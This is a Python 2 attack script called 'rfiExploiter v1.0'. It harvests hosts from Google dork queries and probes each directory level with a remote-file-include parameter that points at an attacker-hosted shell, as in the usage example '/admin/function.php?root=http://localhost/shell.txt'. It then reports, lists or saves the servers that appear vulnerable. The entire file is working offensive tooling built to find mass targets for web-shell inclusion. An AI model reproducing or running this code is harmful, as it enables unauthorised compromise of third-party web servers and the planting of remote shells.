#!/usr/bin/env python
#The tool has 3 options [test, write or list]
#In test mode it will take a query, use google to retrieve 
#hosts. Then it goes down the directories adding
#the include and testing HTTP response of each host.
#Obviously you can get a 200, 302 response without it 
#being your shell (redirection) so manually test before getting to 
#excited.
#
#In write mode it will simply write host + include to 
#a file that you chose for later testing.
#
#In list mode it will even simpler print host + include
#for manual testing.  
#Uncommment line 77 for more verbose output in test mode.
#
#d3hydr8[at]gmail[dot]com

import urllib2, sys, re, httplib, time

def StripTags(text):
     finished = 0
     while not finished:
         finished = 1
         start = text.find("<")
         if start >= 0:
             stop = text[start:].find(">")
             if stop >= 0:
                 text = text[:start] + text[start+stop+1:]
                 finished = 0
     return text
		   
def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def mess():
	print "\n\t   d3hydr8[at]gmail[dot]com rfiExploiter v1.0"
	print "\t-------------------------------------------------"

def gethosts(query):
	
	counter =  10
	hits = []
	
	while counter < int(sys.argv[2]):
		url = 'http://www.google.com/search?hl=en&q='+query+'&hl=en&lr=&start='+repr(counter)+'&sa=N'
		opener = urllib2.build_opener(url)
		opener.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')]
		data = opener.open(url).read()
		hosts = re.findall(('\w+\.[\w\.\-/]*\.\w+'),StripTags(data))
		#Lets add sites found to a list if not already or a google site.
		#We don't want to upset the people that got our list for us.
		for x in hosts:
			if x not in hits and re.search("google", x) == None:
				hits.append(x)
		counter += 10
	print "\n[+] Loaded: ",len(hits),"hosts\n"
	return hits
							
def main(hits):
	if sys.argv[4].lower() == "-t" or sys.argv[4].lower() == "-test":
		for hit in hits:
			print "[-] Testing: ",hit.split('/',1)[0]
			start = int(hit.count("/"))
			if start == 0:
				start = 1
			#Lets test host chopping every dir and adding include
			for x in xrange(start):
				try: 
					hit = hit.rsplit("/",1)[0]
					h = httplib.HTTP(hit.split('/',1)[0])
					h.putrequest("HEAD", hit+"/"+include)
					h.putheader("Host", hit+"/"+include)
					h.endheaders()
					status, reason, headers = h.getreply()
					#print "\t[+] Response:",status, reason
					if status == 200 or status == 302:
						print "\n[+] Target: ",hit+"/"+include
						print "\t[+] Running:",headers.get("Server")
						print "\t[+] Response:",status, reason,"\n"
				except: pass
		print "\n[-] Testing Complete: ",timer(),"\n"
	if sys.argv[4].lower() == "-l" or sys.argv[4].lower() == "-list":
		for hit in hits:
			print "\nTarget:",hit+"/"+include
		print "\n[-] List Complete: ",timer(),"\n"
	if sys.argv[4].lower() == "-w" or sys.argv[4].lower() == "-write":
		f = open(file, "a")
		print "[+] Writing Data:", file
		for hit in hits:
			f.writelines(hit+"/"+include+"\n")
		f.close()
		print "\n[-] Write Complete: ",timer(),"\n"

#................................................

if len(sys.argv) != 5:
	mess()
	print "\n[-] Usage: ./rfiex.py <query> <num of hosts> <location + shell location> <option>"
	print "\n\t[-] Options:"
	print "\t   -t/-test: test the http responses"
	print "\t   -w/-write: writes hosts + shell location to a file for later testing"
	print "\t   -l/-list: prints hosts + shell location for manual testing"
	print "\n[-] ex: ./rfiex.py inurl:/phpbb/ 200 /admin/function.php?root=http://localhost/shell.txt -test\n"
	sys.exit(1)
else:
	query = re.sub("\s","+",sys.argv[1])
	include = sys.argv[3]
	mess()
	time.sleep(2)
	print "\n[+] Starting:",timer()
	print "[+] Query:", query
	print "[+] Include:", include
	if sys.argv[4].lower() == "-w" or sys.argv[4].lower() == "-write":
		file=raw_input('\nFile to save output: ')
		print "\n[+] Output:",file
	print "\n[+] Querying google for hosts..."
	print "[ time depends on your number:",int(sys.argv[2]),"]"
	if include[0] == "/":
		include = include.replace("/","",1)
	main(gethosts(query))
	#aHR0cDovL2Rhcmtjb2RlLmF0aC5jeA==